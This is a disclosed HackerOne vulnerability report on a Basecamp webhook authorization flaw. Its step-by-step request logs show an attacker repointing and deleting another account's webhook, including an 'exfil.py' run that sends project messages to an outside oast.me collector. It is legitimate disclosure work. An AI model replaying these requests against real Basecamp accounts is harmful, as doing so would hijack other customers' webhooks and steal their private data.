---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2026-10-30
submitted: 2026-08-29T22:14:12.439Z
bounty_usd: null
votes: 34
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "deivizzzz"
source: "https://hackerone.com/reports/3979217"
title: " Cross-account webhook takeover: PUT and DELETE on /<account>/webhooks/<id>.json reach another account's webhook"
---
#  Cross-account webhook takeover: PUT and DELETE on /<account>/webhooks/<id>.json reach another account's webhook

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 34 | **Program:** Basecamp | **Disclosed:** 2026-10-30

- Report: [https://hackerone.com/reports/3979217](https://hackerone.com/reports/3979217)
- CWE: Improper Authentication - Generic
- Submitted: 2026-08-29T22:14:12.439Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

Basecamp's webhook update handler authorises on project visibility instead of account membership. From my own account I repointed and deleted a webhook owned by an All-access project in an account I never joined.

## PoC

Two accounts I own, no shared membership. `poc.py` and `exfil.py` produced the attached logs. Webhook ids increment each run.

Step 1, the identities:

```
attacker  identity 28665850 accounts [6267386]
victim    identity 28662102 accounts [6266520]
```

Step 2, webhook ids come from one counter shared by every account:

```
POST /6266520/buckets/48629889/webhooks.json -> 201 {"id":1996542,"active":true,"created_at":"2026-08-29T11:45:11.928Z...
POST /6267386/buckets/48681891/webhooks.json -> 201 {"id":1996543,"active":true,"created_at":"2026-08-29T11:45:12.224Z...
victim webhook id 1996542, attacker webhook id 1996543 (consecutive, different accounts)
```

Step 3, the victim switches to All-access with Basecamp's own control:

```
POST /6266520/projects/48629889/admissions project[admissions]=employee -> 302
GET /6266520/projects/48629889.json -> 200 {"id":48629889,"status":"active","created_at":"2026-08-25T10:00:1...
all_access = True
```

Step 4, attacker's own account id in the path, victim's webhook id:

```
GET  (read handler denies)            GET /6267386/webhooks/1996542.json -> 403 {"message":"You must first seek admission","admission_url":"https://3.basecampapi.com/6267386/buckets/48629889/admissions","admission_method":"POST"}
GET  nonexistent id                   GET /6267386/webhooks/999999999.json -> 404 {"status":404,"error":"Not Found"}
PUT  (write handler ALLOWS)           PUT /6267386/webhooks/1996542.json -> 200 {"id":1996542,"active":true,"created_at":"2026-08-29T11:45:11.928Z","updated_at":"2026-08-29T11:45:17.053Z",...
```

Step 4b, the same write on the other in-scope hosts:

```
PUT via app.basecamp.com              PUT https://app.basecamp.com/6267386/webhooks/1996542.json -> 200 {"id":1996542,"active":true,"created_at":"2026...
PUT via 3.basecamp.com                PUT https://3.basecamp.com/6267386/webhooks/1996542.json -> 200 {"id":1996542,"active":true,"created_at":"2026-0...
```

Step 4c, the attacker cannot take the offered admission:

```
POST /6267386/buckets/48629889/admissions.json -> 404 {"status":404,"error":"Not Found"}
POST /6266520/buckets/48629889/admissions.json -> 401 {"error":"OAuth token is valid, but is not authorized to access this accou...
POST https://app.basecamp.com/6267386/buckets/48629889/admissions.json -> 404 {"status":404,"error":"Not Found"}
POST /6267386/buckets/48681891/admissions.json -> 200 {"id":48681891,"status":"active","created_at...
```

Step 5, victim reads its own webhook:

```
GET /6266520/webhooks/1996542.json -> 200 {"id":1996542,"active":true,"created_at":"2026-08-29T11:45:11.928Z","updated_at":"2026-08-29T11:45:17.983Z","payload_url":"https://example.com/att...
```

Step 6, attacker deletes it:

```
DELETE                                DELETE /6267386/webhooks/1996542.json -> 204 
GET /6266520/webhooks/1996542.json -> 404 {"status":404,"error":"Not Found"}
```

Step 7, negative control, project back to invite-only:

```
POST /6266520/projects/48629889/admissions project[admissions]=invite -> 302
all_access = False
PUT  (denied when invite-only)        PUT /6267386/webhooks/1996544.json -> 403 {"message":"You must first seek admission","admission_url":"https://3.basecampapi.com/6267386/buckets/48629889/admissions","admission_method":"POST"}
GET /6266520/webhooks/1996544.json -> 200 {"id":1996544,"active":true,"created_at":"2026-08-29T11:45:21.537Z","updated_at":"2026...
```

Step 8, `python3 exfil.py https://<collector>/exfil` repeats the hijack against my own collector; the delivery:

```
POST /exfil HTTP/1.1
Host: da9c887k85v4gqmvpbo0pj84kdaxskgzd.oast.me
User-Agent: Basecamp3 Webhook
X-Request-Id: 2e8e380f-f95a-4fa5-8c62-25085b145ab2

{"id":16998387703,"kind":"message_created",...
"title":"BOARD MEETING NOTES - CONFIDENTIAL",...
"bucket":{"id":48629889,"name":"XTENANT-CANARY-VICTIM-PROJECT","type":"Project"},...
"email_address":"hackerone-bc-emp1@sergioaten.cloud","bio":"","admin":true,"owner":true,...
"company":{"id":4236805,"name":"HackerOne Research EMP1"},...
"content":"\u003cdiv\u003eacquisition price is 4.2M, do not share\u003c/div\u003e"
```

Your documentation:

```
* `PUT /webhooks/3.json` allows changing the payload url and types of the webhook with an ID of `3`.
       -- github.com/basecamp/bc3-api/blob/master/sections/webhooks.md, line 460
```

I reverted every change.

## Impact

Any Basecamp user can walk the small webhook id space and, for every All-access project, redirect that customer's webhook to their own server, receiving each message, comment, to-do and document posted there.

## Timeline

- **Report Filed**
- **Report Collaborator Invited**
- **Report Collaborator Joined**
- **Report Severity Updated**
- **Report Triaged**
- **Bounty Awarded**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2026-10-30** @jeremy: Hi @deivizzzz, a heads-up after disclosure: for a couple of hours the report's attachments were public, and two of the scripts (`poc_(2).py` and `exfil.py`) contained the passwords of your two Basecamp test accounts and what looks like your test integration's credentials. We've since made all the attachments internal. Please change those passwords (or delete the test accounts) and delete or rotate the test integration. Thanks!
- **2026-10-30** @deivizzzz: Hey @jeremy  thanks!! 

Those are test accounts I don't care too much but yeah I will delete them 

Thanks an have a nice weekend!!!
